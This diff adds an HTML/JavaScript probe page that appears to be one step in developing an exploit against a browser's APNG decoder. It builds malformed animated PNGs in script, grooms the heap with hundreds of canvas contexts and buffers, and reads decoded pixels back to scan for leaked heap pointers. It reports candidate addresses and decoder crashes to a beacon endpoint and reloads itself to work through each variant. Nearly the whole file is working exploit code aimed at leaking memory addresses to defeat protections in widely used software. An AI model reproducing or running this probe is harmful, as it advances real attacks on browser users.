@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V918</title></head>
+<body><pre id="out">V918 — APNG overread, untried classes: dispose_op=PREVIOUS + num_frames/seq mismatch, pointer-pattern byte scan</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V918-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+function bks(tag,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V918-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+}
+
+/*
+ * v918 — attribution attempt after v916 closed the ctx-chunk forge lane.
+ * Upstream's V674 ("APNG overread leaks 1651 heap pointers from adjacent
+ * allocations via canvas getImageData") is the only confirmed address leak
+ * in the ecosystem; the verbatim probe is not in their public tree
+ * (verified 2026-11-09 at 92780e1). Prior local attempts:
+ *   v674b (10-29, 14.10): 7 build variants, all decoded, zero leak.
+ *   p610   (11-04):       row truncation + palette OOB — decoder reads OOB
+ *                         but lands on zeroed memory (zeroing allocator).
+ * UNTRIED classes (this probe), chosen because "adjacent allocations" is
+ * consistent with a LINEAR overread into LIVE neighbor heap, which no
+ * zero-at-free can scrub:
+ *   V1  dispose_op=PREVIOUS on the first frame (no previous buffer exists)
+ *   V2  PREVIOUS restore with a SMALLER saved rect than the restore target
+ *   V3  PREVIOUS chain with growing rects (each restore copies a larger
+ *       region from a smaller saved buffer)
+ *   V4  fcTL rect shifted fully outside the image (x = IHDR.w): composite
+ *       clipping bugs index the row buffer beyond its rowbytes
+ *   V5  acTL num_frames >> actual fdAT frames
+ *   V6  fdAT sequence-number gaps
+ *   V0  control: two valid frames (must show the marker pattern only)
+ * Grooming before every decode: 300 canvas contexts + 300 pointer-bearing
+ * engine allocations kept alive, so the decode buffers' LIVE neighbors are
+ * pointer-rich (upstream's "adjacent allocations").
+ *
+ * Detection (DAZ law: bytes only, never floats): drawImage -> getImageData
+ * over the full frame, scan 8-byte LE windows for pointer shape
+ * (b[7]==0 && b[6]==0 && b[5]<=0x7F && any low byte set), beacon the count
+ * and the top candidates bit-exact. Any RESULT variance vs V0 is a finding;
+ * a CRASH during a variant's decode is itself a row (the decoder DID go
+ * out of bounds) — the pending-state machine marks it.
+ *
+ * One variant per load (crash-resumable, v911 pattern). ?r=1 resets.
+ */
+
+/* ---------- PNG builder (stored-deflate, CRC32 in JS) ---------- */
+var CRC_T = (function(){ var t=[],c,n,k; for(n=0;n<256;n++){ c=n; for(k=0;k<8;k++) c=(c&1)?(0xEDB88320^(c>>>1)):(c>>>1); t[n]=c>>>0; } return t; })();
+function crc32(buf,start,end){ var c=0xFFFFFFFF; for(var i=start;i<end;i++) c=(CRC_T[(c^buf[i])&0xFF]^(c>>>8))>>>0; return (c^0xFFFFFFFF)>>>0; }
+function chunk(out,type,data){
+  var n=data.length;
+  push32(out,n);
+  var cs=out.length;               /* CRC covers type+data: cs BEFORE the type */
+  for(var i=0;i<4;i++) out.push(type.charCodeAt(i));
+  for(i=0;i<n;i++) out.push(data[i]);
+  var c=crc32(out,cs,out.length); push32(out,c);
+}
+function push32(a,v){ a.push((v>>>24)&255,(v>>>16)&255,(v>>>8)&255,v&255); }
+function zlibStored(raw){
+  var out=[0x78,0x01], i=0;
+  while(i<raw.length){
+    var blk=raw.slice(i,Math.min(i+65535,raw.length)); i+=blk.length;
+    var last=(i>=raw.length)?1:0;
+    out.push(last, blk.length&255, (blk.length>>8)&255, (~blk.length)&255, ((~blk.length)>>8)&255);
+    for(var j=0;j<blk.length;j++) out.push(blk[j]);
+  }
+  var a=1,b=0;
+  for(i=0;i<raw.length;i++){ a=(a+raw[i])%65521; b=(b+a)%65521; }
+  push32(out,((b<<16)|a)>>>0);
+  return out;
+}
+function rowsRGBA(w,h,fill){
+  var raw=[],y,x;
+  for(y=0;y<h;y++){ raw.push(0); for(x=0;x<w;x++){ fill(x,y,raw); } }
+  return raw;
+}
+function png(w,h,extra,frames){
+  var out=[];
+  var sig=[137,80,78,71,13,10,26,10]; for(var i=0;i<8;i++) out.push(sig[i]);
+  var ih=[]; push32(ih,w); push32(ih,h); ih.push(8,6,0,0,0);
+  chunk(out,'IHDR',ih);
+  for(i=0;i<extra.length;i++) chunk(out,extra[i][0],extra[i][1]);
+  for(i=0;i<frames.length;i++) chunk(out,frames[i][0],frames[i][1]);
+  chunk(out,'IEND',[]);
+  return out;
+}
+function fctl(seq,w,h,x,y,disp,blend){
+  var d=[]; push32(d,seq); push32(d,w); push32(d,h); push32(d,x); push32(d,y);
+  d.push(0,10); push32(d,1); d.push(disp,blend); return d;
+}
+function idatFrame(w,h,fill){
+  var raw=rowsRGBA(w,h,fill);
+  return zlibStored(raw);
+}
+function fdatFrame(seq,w,h,fill){
+  var d=[]; push32(d,seq);
+  var z=zlibStored(rowsRGBA(w,h,fill));
+  for(var i=0;i<z.length;i++) d.push(z[i]);
+  return d;
+}
+function markerFill(){ /* 0x41AA41AA per pixel = unambiguous own-marker */
+  return function(x,y,raw){ raw.push(0x41,0xAA,0x41,0xFF); };
+}
+function zeroFill(){
+  return function(x,y,raw){ raw.push(0,0,0,0); };
+}
+
+/* ---------- variants ---------- */
+var W=64,H=64;
+var VARIANTS=[
+  {n:'V0-control', build:function(){
+    return png(W,H,[['acTL',(function(){var d=[];push32(d,2);push32(d,0);return d;})()]],[
+      ['fcTL',fctl(0,W,H,0,0,0,0)], ['IDAT',idatFrame(W,H,markerFill())],
+      ['fcTL',fctl(1,W,H,0,0,0,0)], ['fdAT',fdatFrame(2,W,H,markerFill())]
+    ]);
+  }},
+  {n:'V1-prev-first', build:function(){
+    return png(W,H,[['acTL',(function(){var d=[];push32(d,2);push32(d,0);return d;})()]],[
+      ['fcTL',fctl(0,W,H,0,0,2,0)], ['IDAT',idatFrame(W,H,markerFill())],
+      ['fcTL',fctl(1,W,H,0,0,0,0)], ['fdAT',fdatFrame(2,W,H,markerFill())]
+    ]);
+  }},
+  {n:'V2-prev-smallrect', build:function(){
+    return png(W,H,[['acTL',(function(){var d=[];push32(d,3);push32(d,0);return d;})()]],[
+      ['fcTL',fctl(0,8,8,0,0,0,0)], ['IDAT',idatFrame(8,8,markerFill())],
+      ['fcTL',fctl(1,8,8,0,0,2,0)], ['fdAT',fdatFrame(2,8,8,markerFill())],
+      ['fcTL',fctl(3,W,H,0,0,0,0)], ['fdAT',fdatFrame(4,W,H,markerFill())]
+    ]);
+  }},
+  {n:'V3-prev-growing', build:function(){
+    return png(W,H,[['acTL',(function(){var d=[];push32(d,4);push32(d,0);return d;})()]],[
+      ['fcTL',fctl(0,4,4,0,0,2,0)], ['IDAT',idatFrame(4,4,markerFill())],
+      ['fcTL',fctl(1,16,16,0,0,2,0)], ['fdAT',fdatFrame(2,16,16,markerFill())],
+      ['fcTL',fctl(3,32,32,0,0,2,0)], ['fdAT',fdatFrame(4,32,32,markerFill())],
+      ['fcTL',fctl(5,W,H,0,0,0,0)], ['fdAT',fdatFrame(6,W,H,markerFill())]
+    ]);
+  }},
+  {n:'V4-rect-fully-oob', build:function(){
+    return png(W,H,[['acTL',(function(){var d=[];push32(d,2);push32(d,0);return d;})()]],[
+      ['fcTL',fctl(0,W,H,0,0,0,0)], ['IDAT',idatFrame(W,H,markerFill())],
+      ['fcTL',fctl(1,W,H,W,0,0,0)], ['fdAT',fdatFrame(2,W,H,markerFill())]
+    ]);
+  }},
+  {n:'V5-numframes-bogus', build:function(){
+    return png(W,H,[['acTL',(function(){var d=[];push32(d,64);push32(d,0);return d;})()]],[
+      ['fcTL',fctl(0,W,H,0,0,0,0)], ['IDAT',idatFrame(W,H,markerFill())],
+      ['fcTL',fctl(1,W,H,0,0,0,0)], ['fdAT',fdatFrame(2,W,H,markerFill())]
+    ]);
+  }},
+  {n:'V6-seq-gap', build:function(){
+    return png(W,H,[['acTL',(function(){var d=[];push32(d,2);push32(d,0);return d;})()]],[
+      ['fcTL',fctl(0,W,H,0,0,0,0)], ['IDAT',idatFrame(W,H,markerFill())],
+      ['fcTL',fctl(40,W,H,0,0,0,0)], ['fdAT',fdatFrame(41,W,H,markerFill())]
+    ]);
+  }}
+];
+
+/* ---------- state machine ---------- */
+var st = { idx:0, pending:null };
+try {
+  if (location.search.indexOf('r=1')>=0) { localStorage.removeItem('v918_state'); bk('RESET','cleared'); }
+  else { var raw=localStorage.getItem('v918_state'); if (raw) st=JSON.parse(raw); }
+} catch(e) {}
+function save(){ try{ localStorage.setItem('v918_state', JSON.stringify(st)); }catch(e){} }
+
+if (st.pending) { var pk=st.pending; st.pending=null; save();
+  bk('CRASH-MARK','variant ' + VARIANTS[pk].n + ' died during decode/readback — the decoder went out of bounds (row banked)');
+}
+
+if (st.idx >= VARIANTS.length) {
+  bk('EXHAUSTED','all ' + VARIANTS.length + ' variants done; variants with CRASH-MARK or nonzero foreign candidates are the rows');
+} else {
+  var V = VARIANTS[st.idx];
+  bk('BOOT','variant=' + V.n + ' (' + (st.idx+1) + '/' + VARIANTS.length + ')');
+
+  /* groom: pointer-rich LIVE neighbors for the decode buffers */
+  var groom=[];
+  for (var g=0; g<300; g++) {
+    var gc=document.createElement('canvas'); gc.width=1; gc.height=1;
+    var gx=gc.getContext('2d'); gx.lineWidth=1000+g;
+    for (var gs=0; gs<15; gs++) { gx.save(); gx.lineWidth=2000+gs; }
+    groom.push({c:gc,x:gx});
+  }
+  for (g=0; g<100; g++) { groom.push(new ArrayBuffer(65536)); }
+  bks('GROOM','contexts=300 stateful+kept, abs=100');
+
+  var bytes=V.build();
+  var bin=''; for (var bi=0; bi<bytes.length; bi++) bin+=String.fromCharCode(bytes[bi]);
+  var dataUrl='data:image/png;base64,' + btoa(bin);
+  bks('BUILT','variant=' + V.n + '|png=' + bytes.length + 'B (sync)');
+
+  st.pending = st.idx; save();
+  var wd = setTimeout(function(){ setTimeout(function(){ location.reload(); }, 300); }, 20000);
+
+  var img = new Image();
+  img.onload = function(){
+    clearTimeout(wd); st.pending=null; save();
+    bks('DECODED','variant=' + V.n + '|w=' + img.width + '|h=' + img.height + ' (sync)');
+    var cv=document.createElement('canvas'); cv.width=img.width; cv.height=img.height;
+    var cx=cv.getContext('2d');
+    cx.drawImage(img,0,0);
+    /* read every frame position the decoder touched */
+    var id=cx.getImageData(0,0,cv.width,cv.height);
+    var u=new Uint8Array(id.data.buffer);
+    var nz=0, cands=[], i;
+    for (i=0;i+8<=u.length;i+=8) {
+      var nzq = u[i]|u[i+1]|u[i+2]|u[i+3]|u[i+4]|u[i+5]|u[i+6]|u[i+7];
+      if (nzq) nz++;
+      if (u[i+7]===0 && u[i+6]===0 && u[i+5]<=0x7F &&
+          (u[i]|u[i+1]|u[i+2]|u[i+3]|u[i+4]|u[i+5])!==0) {
+        var hex='0x';
+        for (var b7=7;b7>=0;b7--) hex+=('0'+u[i+b7].toString(16)).slice(-2);
+        cands.push(i+':'+hex);
+      }
+    }
+    bk('SCAN','variant=' + V.n + '|nz8=' + nz + '/' + (u.length>>3) + '|ptrcands=' + cands.length);
+    if (cands.length) {
+      for (i=0;i<Math.min(cands.length,8);i++) bk('CAND',cands[i]);
+    }
+    /* marker check: our own fill visible = decode+readback path sane */
+    var mk = (u[0]===0x41 && u[1]===0xAA);
+    bk('MARKER', mk ? 'own-pattern-visible' : 'own-pattern-ABSENT (mangled or overread overwrote head)');
+    st.idx++; save();
+    setTimeout(function(){ location.reload(); }, 500);
+  };
+  img.onerror = function(){
+    clearTimeout(wd); st.pending=null; save();
+    bk('DECODE-FAIL','variant=' + V.n + ' rejected by the decoder (no OOB, no crash)');
+    st.idx++; save();
+    setTimeout(function(){ location.reload(); }, 500);
+  };
+  img.src = dataUrl;
+}
+</script></body></html>
